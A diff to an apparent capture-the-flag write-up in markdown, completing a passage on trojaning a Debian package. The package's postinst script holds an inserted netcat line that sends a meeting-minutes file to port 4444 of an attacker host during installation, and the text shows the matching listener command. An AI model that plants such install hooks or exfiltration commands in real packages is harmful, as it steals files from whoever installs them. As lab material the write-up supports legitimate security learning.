@@ -26,8 +26,11 @@ This package was modified to include this line in the postinst script:
 
     /bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
 
-That way the remoter device would download this package and install it. In course of t
+That way the remote device would download this package and install it. In course of the installation, the file in scope would be sent to port 4444 of the attacking host, which has to run the command
+
+    nc -lvp 4444 > text
+to receive the text.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjY5MDI1NjE4LC04NzgzOTIyMTYsNTE0Mj
-A5MTU5XX0=
+eyJoaXN0b3J5IjpbLTUyNDU2NDY5OSwtODc4MzkyMjE2LDUxND
+IwOTE1OV19
 -->
